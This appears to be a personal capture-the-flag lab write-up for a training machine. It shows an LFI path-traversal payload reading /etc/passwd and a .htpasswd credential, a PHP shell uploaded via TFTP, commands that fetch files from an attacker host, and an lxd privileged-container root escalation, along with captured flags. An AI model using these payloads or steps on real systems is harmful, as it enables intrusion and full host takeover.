public:: true
tags:: lxc, apache, htaccess, htpasswd, tftp

- Open ports
	- TCP
	  
	  ```
	  80/tcp open  http
	  ```
	- UDP
	  id:: 655238b7-09f8-454b-ba4a-40a2d4b29455
	  
	  ```
	  68/udp open|filtered dhcpc
	  69/udp open|filtered tftp
	  ```
- Findings
	- LFI at `http://10.129.38.202/?file=`
	  id:: 655238e3-68b6-42e6-9ec4-6edf9f86c35e
	- OS usernames
	  *Fetched from `http://10.129.38.202/?file=../../../../../../../../etc/passwd`*
	  ```
	  # Only list the most interesting ones
	  root
	  [...]
	  backup
	  mike
	  tftp
	  [...]
	  ```
	- CANCELED Tested RFI but didn't work
	- Try to use `gobuster` to search for known dotfiles in `/home/mike`
	  *Used this dotfiles oriented [wordlist](https://github.com/Karanxa/Bug-Bounty-Wordlists/blob/main/dotfiles.txt)*.
	  ```bash
	  > gobuster fuzz -u "http://10.129.38.202/?file=../../../../../../../../home/mike/FUZZ" -w wordlist-dotfiles.txt --exclude-length 0
	  [...]
	  Found: [Status=200] [Length=15] [Word=.bash_profile] http://10.129.38.202/?file=../../../../../../../../home/mike/.bash_profile
	  Found: [Status=200] [Length=220] [Word=.bash_logout] http://10.129.38.202/?file=../../../../../../../../home/mike/.bash_logout
	  Found: [Status=200] [Length=3771] [Word=.bashrc] http://10.129.38.202/?file=../../../../../../../../home/mike/.bashrc
	  Found: [Status=200] [Length=807] [Word=.profile] http://10.129.38.202/?file=../../../../../../../../home/mike/.profile
	  ```
	  No interesting files found.
	- Found an interesting `.htpasswd` file
	  id:: 65523a47-5070-40a1-af56-9b48b9b351b4
	  
	  ```bash
	  > curl "http://10.129.38.202/?file=../../../../../../../../var/www/html/.htpasswd"
	  mike:Sheffield19
	  ```
		- TODO Search for a wordlist optimized for webservers file and use it with `gobuster`.
		- #+BEGIN_CAUTION
		  mike:Sheffield19
		  #+END_CAUTION
		- #+BEGIN_TIP
		  I now have the username and password coming from a `.htpasswd` file. Maybe `mike` reuse the same password for his OS user.
		  #+END_TIP
	- I can upload files via [TFTP](logseq://graph/HTB-Notes?block-id=655238b7-09f8-454b-ba4a-40a2d4b29455) and execute php file via the [LFI](logseq://graph/HTB-Notes?block-id=655238e3-68b6-42e6-9ec4-6edf9f86c35e).
		- Upload a php shell via TFTP.
		- Execute the php shell with the LFI.
		- ```bash
		  > id
		  uid=33(www-data) gid=33(www-data) groups=33(www-data)
		  > www-data@included:/$ su mike
		  Password: Sheffield19
		  > id
		  uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
		  ```
	- **User flag** at `/home/mike/user.txt`
		- a56ef91d70cfbf2cdb8f454c006935a1
		  background-color:: green
- ### Privesc
	- The user `mike` is part of the group `lxc(108)`. We can upload an lxc container image to the target machine and start a privileged container to escalate privileges.
		- Prepare the container image in Kali
		  *Download the unified (incus.tar.xz and rootfs.tar.xz) lxc image for alpine from [here](https://images.linuxcontainers.org/images/)*
		  ```bash
		  curl "https://images.linuxcontainers.org/images/alpine/3.15/amd64/default/20231107_13%3A00/incus.tar.xz" -o incus.tar.xz
		  curl "https://images.linuxcontainers.org/images/alpine/3.15/amd64/default/20231107_13%3A00/rootfs.tar.xz" -o rootfs.tar.xz
		  ```
		- Spawn a webserver to later upload those files to the victim machine
		- Import the alpine container image to the target machine
		  *From the target machine*
		  ```bash
		  # Fetch the alpine image
		  curl "http://10.10.14.147:8000/alpine.tar.xz" -o alpine.tar.xz
		  curl "http://10.10.14.147:8000/rootfs.tar.xz" -o rootfs.tar.xz
		  # Import it
		  lxc image import incus.tar.xz rootfs.tar.xz --alias alpine
		  # Check if it got imported
		  mike@included:~$ lxc image ls
		  +--------+--------------+--------+------------------------------------------+--------+--------+------------------------------+
		  | ALIAS  | FINGERPRINT  | PUBLIC |               DESCRIPTION                |  ARCH  |  SIZE  |         UPLOAD DATE          |
		  +--------+--------------+--------+------------------------------------------+--------+--------+------------------------------+
		  | alpine | 9bea64510930 | no     | Alpinelinux 3.15 x86_64 (20231107_13:00) | x86_64 | 2.45MB | Nov 12, 2023 at 5:22pm (UTC) |
		  +--------+--------------+--------+------------------------------------------+--------+--------+------------------------------+
		  ```
		- Start a privileged container
		  
		  ```bash
		  lxc init alpine privesc -c security.privileged=true
		  lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
		  lxc start privesc
		  ```
		- Access the container and all its loots
		  ```bash
		  lxc exec privesc /bin/sh
		  ```
	- **Root flag** at `/root/root.txt`
		- c693d9c7499d9f572ee375d4c14c7bcf
		  background-color:: green